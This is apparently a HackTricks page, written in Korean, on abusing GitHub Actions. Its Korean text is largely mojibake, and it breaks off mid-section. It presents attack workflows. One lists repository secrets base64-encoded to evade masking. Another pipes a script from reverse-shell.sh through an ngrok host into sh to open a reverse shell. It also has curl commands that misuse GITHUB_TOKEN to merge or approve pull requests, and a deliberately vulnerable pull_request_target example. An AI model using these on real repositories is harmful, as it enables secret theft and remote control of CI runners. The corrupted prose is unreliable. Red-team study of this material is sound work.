# Abusing Github Actions

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° íˆì–´ë¡œê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ PDFë¡œ HackTricks ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬** [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

ì´ í˜ì´ì§€ì—ì„œëŠ” ë‹¤ìŒì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **ê³µê²©ìê°€ Github Actionì— ì•¡ì„¸ìŠ¤**í•˜ëŠ” ëª¨ë“  ì˜í–¥ì˜ ìš”ì•½
* **ì•¡ì…˜ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë‹¤ì–‘í•œ ë°©ë²•**:
* ì•¡ì…˜ì„ ìƒì„±í•  **ê¶Œí•œ**ì´ ìˆëŠ” ê²½ìš°
* **í’€ ë¦¬í€˜ìŠ¤íŠ¸** ê´€ë ¨ íŠ¸ë¦¬ê±°ë¥¼ ë‚¨ìš©í•˜ëŠ” ê²½ìš°
* **ê¸°íƒ€ ì™¸ë¶€ ì•¡ì„¸ìŠ¤** ê¸°ìˆ ì„ ë‚¨ìš©í•˜ëŠ” ê²½ìš°
* ì´ë¯¸ ì†ìƒëœ ì €ì¥ì†Œì—ì„œ **í”¼ë²—**í•˜ëŠ” ê²½ìš°
* ë§ˆì§€ë§‰ìœ¼ë¡œ, ë‚´ë¶€ì—ì„œ ì•¡ì…˜ì„ ë‚¨ìš©í•˜ëŠ” **í¬ìŠ¤íŠ¸-ìµìŠ¤í”Œë¡œì‡ë ˆì´ì…˜ ê¸°ìˆ **ì— ëŒ€í•œ ì„¹ì…˜ (ì–¸ê¸‰ëœ ì˜í–¥ì„ ì´ˆë˜)

## ì˜í–¥ ìš”ì•½

[**Github Actionsì— ëŒ€í•œ ê¸°ë³¸ ì •ë³´ë¥¼ í™•ì¸í•˜ë ¤ë©´ ì—¬ê¸°ë¥¼ í´ë¦­í•˜ì„¸ìš”**](../basic-github-information.md#github-actions).

**ì €ì¥ì†Œ**ì—ì„œ **ì„ì˜ì˜ Github ì•¡ì…˜ì„ ì‹¤í–‰í•˜ê±°ë‚˜ ì½”ë“œë¥¼ ì‚½ì…**í•  ìˆ˜ ìˆëŠ” ê²½ìš° ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* í•´ë‹¹ ì €ì¥ì†Œ/ì¡°ì§ì—ì„œ **ë¹„ë°€**ì„ **ë„ìš©**í•  ìˆ˜ ìˆìŒ
* ì‚½ì…ë§Œ í•  ìˆ˜ ìˆëŠ” ê²½ìš°, ì›Œí¬í”Œë¡œì— ì´ë¯¸ ì¡´ì¬í•˜ëŠ” ê²ƒì„ ë„ìš©í•  ìˆ˜ ìˆìŒ
* AWS ë° GCPì™€ ê°™ì€ ë‹¤ë¥¸ í”Œë«í¼ì— ì•¡ì„¸ìŠ¤í•˜ê¸° ìœ„í•´ **ì €ì¥ì†Œ ê¶Œí•œ**ì„ ë‚¨ìš©í•  ìˆ˜ ìˆìŒ
* ì‚¬ìš©ì ì •ì˜ ì›Œì»¤ì—ì„œ **ì½”ë“œ ì‹¤í–‰** (ì‚¬ìš©ì ì •ì˜ ì›Œì»¤ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°) ë° ê±°ê¸°ì„œ í”¼ë²—ì„ ì‹œë„í•  ìˆ˜ ìˆìŒ
* ì €ì¥ì†Œ **ì½”ë“œë¥¼ ë®ì–´ì“°ê¸°**í•  ìˆ˜ ìˆìŒ
* ì´ëŠ” `GITHUB_TOKEN`ì˜ ê¶Œí•œì— ë”°ë¼ ë‹¤ë¦„
* **ë°°í¬** ë° ê¸°íƒ€ **ì•„í‹°íŒ©íŠ¸**ë¥¼ **ì†ìƒ**ì‹œí‚¬ ìˆ˜ ìˆìŒ
* ì½”ë“œê°€ ë°°í¬í•˜ê±°ë‚˜ ì €ì¥í•˜ëŠ” ê²½ìš° í•´ë‹¹ ì½”ë“œë¥¼ ìˆ˜ì •í•˜ì—¬ ì¶”ê°€ ì•¡ì„¸ìŠ¤ë¥¼ ì–»ì„ ìˆ˜ ìˆìŒ

## GITHUB\_TOKEN

ì´ "**ë¹„ë°€**"(`${{ secrets.GITHUB_TOKEN }}` ë° `${{ github.token }}`ì—ì„œ ë‚˜ì˜´)ì€ ê´€ë¦¬ìê°€ ì´ ì˜µì…˜ì„ í™œì„±í™”í•  ë•Œ ì œê³µë©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

ì´ í† í°ì€ **Github ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‚¬ìš©í• ** ê²ƒì´ë¯€ë¡œ ë™ì¼í•œ ì—”ë“œí¬ì¸íŠ¸ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
GithubëŠ” GitHub ë‚´ì—ì„œ **í¬ë¡œìŠ¤-ì €ì¥ì†Œ ì•¡ì„¸ìŠ¤**ë¥¼ í—ˆìš©í•˜ëŠ” [**íë¦„**](https://github.com/github/roadmap/issues/74)ì„ ì¶œì‹œí•´ì•¼ í•˜ë¯€ë¡œ ì €ì¥ì†Œê°€ `GITHUB_TOKEN`ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë‚´ë¶€ ì €ì¥ì†Œì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ì´ í† í°ì˜ ê°€ëŠ¥í•œ **ê¶Œí•œ**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

ì´ í† í°ì€ ì‘ì—…ì´ ì™„ë£Œëœ í›„ **ë§Œë£Œ**ë©ë‹ˆë‹¤.\
ì´ëŸ¬í•œ í† í°ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

ì´ í† í°ìœ¼ë¡œ í•  ìˆ˜ ìˆëŠ” í¥ë¯¸ë¡œìš´ ì‘ì—… ëª‡ ê°€ì§€:

{% tabs %}
{% tab title="PR ë³‘í•©" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="PR ìŠ¹ì¸" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR ìƒì„±" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
ì—¬ëŸ¬ ë²ˆì— ê±¸ì³ **Github Actions envsë‚˜ secrets ì•ˆì— github ì‚¬ìš©ì í† í°ì„ ì°¾ì„ ìˆ˜ ìˆëŠ”** ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í† í°ì€ ë¦¬í¬ì§€í† ë¦¬ì™€ ì¡°ì§ì— ëŒ€í•´ ë” ë§ì€ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

<details>

<summary>Github Action ì¶œë ¥ì—ì„œ secrets ëª©ë¡ í‘œì‹œ</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

<details>

<summary>ì‹œí¬ë¦¿ì„ ì‚¬ìš©í•˜ì—¬ ë¦¬ë²„ìŠ¤ ì‰˜ íšë“</summary>

\`\`\`yaml name: revshell on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: create\_pull\_request: runs-on: ubuntu-latest steps: - name: Get Rev Shell run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ì €ì¥ì†Œì—ì„œ Github í† í°ì— ë¶€ì—¬ëœ ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ì‘ì—… ë¡œê·¸ë¥¼ í™•ì¸**í•©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## í—ˆìš©ëœ ì‹¤í–‰

{% hint style="info" %}
ì´ëŠ” Github ì‘ì—…ì„ ì¹¨í•´í•˜ëŠ” ê°€ì¥ ì‰¬ìš´ ë°©ë²•ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš°ì—ëŠ” **ì¡°ì§ ë‚´ì—ì„œ ìƒˆ ì €ì¥ì†Œë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ**ì´ ìˆê±°ë‚˜ **ì €ì¥ì†Œì— ì“°ê¸° ê¶Œí•œ**ì´ ìˆëŠ” ê²ƒìœ¼ë¡œ ê°€ì •í•©ë‹ˆë‹¤.

ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì— ìˆëŠ” ê²½ìš° [ì‚¬í›„ ì¹¨íˆ¬ ê¸°ìˆ ](./#post-exploitation-techniques-from-inside-an-action)ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### ì €ì¥ì†Œ ìƒì„±ì—ì„œ ì‹¤í–‰

ì¡°ì§ êµ¬ì„±ì›ì´ **ìƒˆ ì €ì¥ì†Œë¥¼ ìƒì„±**í•  ìˆ˜ ìˆê³  Github ì‘ì—…ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê²½ìš°, **ìƒˆ ì €ì¥ì†Œë¥¼ ìƒì„±í•˜ê³  ì¡°ì§ ìˆ˜ì¤€ì—ì„œ ì„¤ì •ëœ ë¹„ë°€ì„ íƒˆì·¨**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ìƒˆ ë¸Œëœì¹˜ì—ì„œ ì‹¤í–‰

ì´ë¯¸ Github ì‘ì—…ì´ êµ¬ì„±ëœ ì €ì¥ì†Œì— **ìƒˆ ë¸Œëœì¹˜ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆëŠ” ê²½ìš°, í•´ë‹¹ ì‘ì—…ì„ **ìˆ˜ì •**í•˜ê³  ë‚´ìš©ì„ **ì—…ë¡œë“œ**í•œ ë‹¤ìŒ **ìƒˆ ë¸Œëœì¹˜ì—ì„œ í•´ë‹¹ ì‘ì—…ì„ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ ì €ì¥ì†Œ ë° ì¡°ì§ ìˆ˜ì¤€ì˜ ë¹„ë°€ì„ **ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ê·¸ëŸ¬ë‚˜ í•´ë‹¹ ë¹„ë°€ì˜ ì´ë¦„ì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤).

ìˆ˜ì •ëœ ì‘ì—…ì„ **ìˆ˜ë™ìœ¼ë¡œ** ì‹¤í–‰í•˜ê±°ë‚˜ **PRì´ ìƒì„±**ë  ë•Œ ë˜ëŠ” **ì½”ë“œê°€ í‘¸ì‹œ**ë  ë•Œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì–¼ë§ˆë‚˜ ì‹œë„ëŸ½ê²Œ í•˜ê³  ì‹¶ì€ì§€ì— ë”°ë¼):

```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```

***

## í¬í¬ëœ ì‹¤í–‰

{% hint style="info" %}
ê³µê²©ìê°€ ë‹¤ë¥¸ ì €ì¥ì†Œì˜ **Github Actionì„ ì‹¤í–‰**í•  ìˆ˜ ìˆê²Œ í•˜ëŠ” ë‹¤ì–‘í•œ íŠ¸ë¦¬ê±°ê°€ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ íŠ¸ë¦¬ê±° ê°€ëŠ¥í•œ ì‘ì—…ì´ ì˜ëª» êµ¬ì„±ë˜ì–´ ìˆë‹¤ë©´, ê³µê²©ìê°€ ê·¸ê²ƒë“¤ì„ ì¹¨í•´í•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### `pull_request`

ì›Œí¬í”Œë¡œ íŠ¸ë¦¬ê±° \*\*`pull_request`\*\*ëŠ” ì¼ë°˜ì ìœ¼ë¡œ **ì²« ë²ˆì§¸ í˜‘ë ¥**ì¸ ê²½ìš°ì—ëŠ” **ìœ ì§€ì**ê°€ ì›Œí¬í”Œë¡œì˜ **ì‹¤í–‰ì„ ìŠ¹ì¸**í•´ì•¼ í•˜ëŠ” ê²½ìš°ë¥¼ ì œì™¸í•˜ê³ , í’€ ë¦¬í€˜ìŠ¤íŠ¸ê°€ ìˆ˜ì‹ ë  ë•Œë§ˆë‹¤ ì›Œí¬í”Œë¡œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**ê¸°ë³¸ ì œí•œ**ì´ **ì²« ë²ˆì§¸** ê¸°ì—¬ìë¥¼ ëŒ€ìƒìœ¼ë¡œ í•˜ê¸° ë•Œë¬¸ì—, ìœ íš¨í•œ ë²„ê·¸/ì˜¤íƒ€ë¥¼ ìˆ˜ì •í•˜ê³  ìƒˆë¡œìš´ `pull_request` ê¶Œí•œì„ ë‚¨ìš©í•˜ê¸° ìœ„í•´ **ë‹¤ë¥¸ PRì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

**ì´ë¥¼ í…ŒìŠ¤íŠ¸í–ˆì§€ë§Œ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**: ~~ë‹¤ë¥¸ ì˜µì…˜ì€ í”„ë¡œì íŠ¸ì— ê¸°ì—¬í•œ ì‚¬ëŒì˜ ì´ë¦„ìœ¼ë¡œ ê³„ì •ì„ ë§Œë“¤ê³  ê·¸ ê³„ì •ì„ ì‚­ì œí•˜ëŠ” ê²ƒì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.~~
{% endhint %}

ë˜í•œ, ê¸°ë³¸ì ìœ¼ë¡œ **ëŒ€ìƒ ì €ì¥ì†Œì— ì“°ê¸° ê¶Œí•œ** ë° **ì‹œí¬ë¦¿ ì•¡ì„¸ìŠ¤**ë¥¼ ë°©ì§€í•˜ë©° [**ë¬¸ì„œ**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)ì—ì„œ ì–¸ê¸‰ëœ ëŒ€ë¡œ **`GITHUB_TOKEN`ì„ ì œì™¸í•œ ì‹œí¬ë¦¿ì€ í¬í¬ëœ ì €ì¥ì†Œì—ì„œ ì›Œí¬í”Œë¡œê°€ íŠ¸ë¦¬ê±°ë  ë•Œ ëŸ¬ë„ˆë¡œ ì „ë‹¬ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. **`GITHUB_TOKEN`ì€ í¬í¬ëœ ì €ì¥ì†Œì˜ í’€ ë¦¬í€˜ìŠ¤íŠ¸ì—ì„œ ì½ê¸° ì „ìš© ê¶Œí•œ**ì„ ê°–ìŠµë‹ˆë‹¤.

ê³µê²©ìëŠ” Github Actionì˜ ì •ì˜ë¥¼ ìˆ˜ì •í•˜ì—¬ ì„ì˜ì˜ ì‘ì—…ì„ ì‹¤í–‰í•˜ê³  ì„ì˜ì˜ ì‘ì—…ì„ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì–¸ê¸‰ëœ ì œí•œ ì‚¬í•­ìœ¼ë¡œ ì¸í•´ ì‹œí¬ë¦¿ì„ ë„ìš©í•˜ê±°ë‚˜ ì €ì¥ì†Œë¥¼ ë®ì–´ì“¸ ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤.

{% hint style="danger" %}
**ë„¤, ê³µê²©ìê°€ PRì—ì„œ íŠ¸ë¦¬ê±°ë  Github Actionì„ ë³€ê²½í•˜ë©´, ê·¸ì˜ Github Actionì´ ì‚¬ìš©ë˜ê³  ì›ë³¸ ì €ì¥ì†Œì˜ ê²ƒì´ ì•„ë‹™ë‹ˆë‹¤!**
{% endhint %}

ê³µê²©ìê°€ ì‹¤í–‰ë˜ëŠ” ì½”ë“œë¥¼ ì œì–´í•˜ê¸° ë•Œë¬¸ì— `GITHUB_TOKEN`ì— ì‹œí¬ë¦¿ì´ë‚˜ ì“°ê¸° ê¶Œí•œì´ ì—†ë”ë¼ë„ ê³µê²©ìëŠ” ì˜ˆë¥¼ ë“¤ì–´ **ì•…ì„± ì•„í‹°íŒ©íŠ¸ë¥¼ ì—…ë¡œë“œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **`pull_request_target`**

ì›Œí¬í”Œë¡œ íŠ¸ë¦¬ê±° \*\*`pull_request_target`\*\*ëŠ” ëŒ€ìƒ ì €ì¥ì†Œì— **ì“°ê¸° ê¶Œí•œ**ê³¼ **ì‹œí¬ë¦¿ ì•¡ì„¸ìŠ¤**ë¥¼ ê°–ê³  ìˆìœ¼ë©° (ê¶Œí•œì„ ìš”ì²­í•˜ì§€ ì•ŠìŒ).

ì›Œí¬í”Œë¡œ íŠ¸ë¦¬ê±° \*\*`pull_request_target`\*\*ëŠ” **PRì—ì„œ ì‹¤í–‰ë˜ëŠ” ê²ƒì´ ì•„ë‹Œ ê¸°ë³¸ ì»¨í…ìŠ¤íŠ¸**ì—ì„œ ì‹¤í–‰ë˜ë©° (ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì§€ ì•ŠìŒ). `pull_request_target`ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [**ë¬¸ì„œ**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.\
ë˜í•œ, ì´ íŠ¹ì • ìœ„í—˜í•œ ì‚¬ìš©ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [**github ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)ì„ í™•ì¸í•˜ì‹­ì‹œì˜¤.

**ì‹¤í–‰ë˜ëŠ” ì›Œí¬í”Œë¡œ**ê°€ **PRì´ ì•„ë‹Œ ê¸°ë³¸**ì—ì„œ ì •ì˜ëœ ê²ƒì´ê¸° ë•Œë¬¸ì— \*\*`pull_request_target`\*\*ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ **ì•ˆì „**í•´ ë³´ì¼ ìˆ˜ ìˆì§€ë§Œ, **ê·¸ë ‡ì§€ ì•Šì€ ê²½ìš°ë„ ìˆìŠµë‹ˆë‹¤**.

ì´ ê²½ìš°ì—ëŠ” **ì‹œí¬ë¦¿ì— ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) íŠ¸ë¦¬ê±°ëŠ” `completed`, `requested`, ë˜ëŠ” `in_progress`ì¼ ë•Œ ë‹¤ë¥¸ ì›Œí¬í”Œë¡œì—ì„œ ì›Œí¬í”Œë¡œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì˜ˆì—ì„œëŠ” "Run Tests" ì›Œí¬í”Œë¡œê°€ ì™„ë£Œëœ í›„ì— ì›Œí¬í”Œë¡œë¥¼ ì‹¤í–‰í•˜ë„ë¡ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤:

```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```

ê²Œë‹¤ê°€ ë¬¸ì„œì— ë”°ë¥´ë©´: `workflow_run` ì´ë²¤íŠ¸ì— ì˜í•´ ì‹œì‘ëœ ì›Œí¬í”Œë¡œìš°ëŠ” **ì´ì „ ì›Œí¬í”Œë¡œìš°ê°€ ì•„ë‹ˆë”ë¼ë„ ë¹„ë°€ ì •ë³´ì— ì•¡ì„¸ìŠ¤í•˜ê³  í† í°ì„ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ì´ ìœ í˜•ì˜ ì›Œí¬í”Œë¡œìš°ëŠ” ì™¸ë¶€ ì‚¬ìš©ìê°€ **`pull_request`** ë˜ëŠ” **`pull_request_target`ë¥¼ í†µí•´ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆëŠ” ì›Œí¬í”Œë¡œìš°ì— ì˜ì¡´í•˜ëŠ” ê²½ìš° ê³µê²©ì„ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ ì˜ˆì‹œëŠ”** [**ì´ ë¸”ë¡œê·¸ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** ì²« ë²ˆì§¸ ì˜ˆì‹œëŠ” \*\*`workflow_run`\*\*ì„ íŠ¸ë¦¬ê±°í•˜ëŠ” ì›Œí¬í”Œë¡œìš°ê°€ ê³µê²©ìì˜ ì½”ë“œë¥¼ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤: `${{ github.event.pull_request.head.sha }}`\
ë‘ ë²ˆì§¸ ì˜ˆì‹œëŠ” **ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ”** ì½”ë“œì—ì„œ **ì•„í‹°íŒ©íŠ¸**ë¥¼ **ì „ë‹¬**í•˜ê³  ì´ ì•„í‹°íŒ©íŠ¸ì˜ ë‚´ìš©ì„ ì‚¬ìš©í•˜ì—¬ **RCEì— ì·¨ì•½**í•˜ê²Œ ë§Œë“œëŠ” ê²ƒì…ë‹ˆë‹¤.

### `workflow_call`

TODO

TODO: pull\_requestì—ì„œ ì‹¤í–‰ë  ë•Œ ì‚¬ìš©/ë‹¤ìš´ë¡œë“œëœ ì½”ë“œê°€ ì›ë³¸ì—ì„œ ì˜¤ëŠ”ì§€ í¬í¬ëœ PRì—ì„œ ì˜¤ëŠ”ì§€ í™•ì¸

## í¬í¬ëœ ì‹¤í–‰ ë‚¨ìš©

ì™¸ë¶€ ê³µê²©ìê°€ ê¹ƒí—ˆë¸Œ ì›Œí¬í”Œë¡œìš°ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ëª¨ë‘ ì–¸ê¸‰í–ˆìœ¼ë‹ˆ, ì´ ì‹¤í–‰ì´ ì˜ëª» êµ¬ì„±ëœ ê²½ìš° ì–´ë–»ê²Œ ë‚¨ìš©ë  ìˆ˜ ìˆëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤:

### ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì²´í¬ì•„ì›ƒ ì‹¤í–‰

\*\*`pull_request`\*\*ì˜ ê²½ìš°, ì›Œí¬í”Œë¡œìš°ëŠ” **PRì˜ ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì‹¤í–‰**ë©ë‹ˆë‹¤(ë”°ë¼ì„œ **ì•…ì„± PR ì½”ë“œê°€ ì‹¤í–‰**ë©ë‹ˆë‹¤), í•˜ì§€ë§Œ ëˆ„êµ°ê°€ê°€ **ë¨¼ì € ìŠ¹ì¸**í•´ì•¼ í•˜ë©° ì¼ë¶€ [ì œí•œ](./#pull\_request)ìœ¼ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤.

\*\*`pull_request_target` ë˜ëŠ” `workflow_run`\*\*ì„ ì‚¬ìš©í•˜ëŠ” ì›Œí¬í”Œë¡œìš°ê°€ \*\*`pull_request_target` ë˜ëŠ” `pull_request`\*\*ì—ì„œ íŠ¸ë¦¬ê±°ë  ìˆ˜ ìˆëŠ” ì›Œí¬í”Œë¡œìš°ì— ì˜ì¡´í•˜ëŠ” ê²½ìš° ì›ë³¸ ë¦¬í¬ì§€í† ë¦¬ì˜ ì½”ë“œê°€ ì‹¤í–‰ë˜ë¯€ë¡œ **ê³µê²©ìëŠ” ì‹¤í–‰ëœ ì½”ë“œë¥¼ ì œì–´í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.

{% hint style="danger" %}
ê·¸ëŸ¬ë‚˜ **ì•¡ì…˜**ì— **ëª…ì‹œì  PR ì²´í¬ì•„ì›ƒ**ì´ ìˆê³  PR ì½”ë“œë¥¼ ê°€ì ¸ì˜¤ëŠ” ê²½ìš°(ë² ì´ìŠ¤ê°€ ì•„ë‹Œ), ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ì½”ë“œê°€ ì‚¬ìš©ë©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´(12ë²ˆì§¸ ì¤„ì—ì„œ PR ì½”ë“œê°€ ë‹¤ìš´ë¡œë“œë˜ëŠ” ë¶€ë¶„ í™•ì¸):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># ë³´ì•ˆ ì·¨ì•½. ì˜ˆì‹œë¡œë§Œ ì œê³µë¨.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

ì ì¬ì ìœ¼ë¡œ **ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½”ë“œê°€ `npm install` ë˜ëŠ” `npm build` ì¤‘ì— ì‹¤í–‰**ë˜ë©°, ë¹Œë“œ ìŠ¤í¬ë¦½íŠ¸ì™€ ì°¸ì¡°ëœ **íŒ¨í‚¤ì§€ëŠ” PR ì‘ì„±ìê°€ ì œì–´**í•©ë‹ˆë‹¤.

{% hint style="warning" %}
